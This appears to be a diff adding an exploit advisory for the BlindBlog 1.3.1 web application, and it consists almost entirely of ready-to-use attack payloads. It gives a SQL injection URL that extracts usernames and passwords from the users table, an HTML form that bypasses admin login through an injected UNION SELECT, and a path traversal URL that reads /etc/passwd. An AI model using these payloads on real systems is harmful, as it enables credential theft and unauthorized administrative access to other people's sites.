@@ -1,0 +1,23 @@
+http://www..example.com/path/comment.php?id=-1' UNION ALL SELECT
+NULL,CONCAT(username, char(58), password),3,4 FROM cblog_users%23
+
+
+<html>
+       <head>
+               <title>BlindBlog 1.3.1 Authentication Bypass Exploit</title>
+       </head>
+       <body>
+               <form
+action="http://www.example.com/path/admin/admin.login.php?go=1"
+method="POST">
+                       <input type="hidden" name="username" value="-1'
+UNION ALL SELECT
+1,'admin',MD5('expl')#">
+                       <input type="hidden" name="password" value="expl">
+                       <input type="submit" value="Exploit">
+               </form>
+       </body>
+</html>
+
+
+http://www.example.com/path/admin/admin.php?act=/../../../../../../../etc/passwd%00
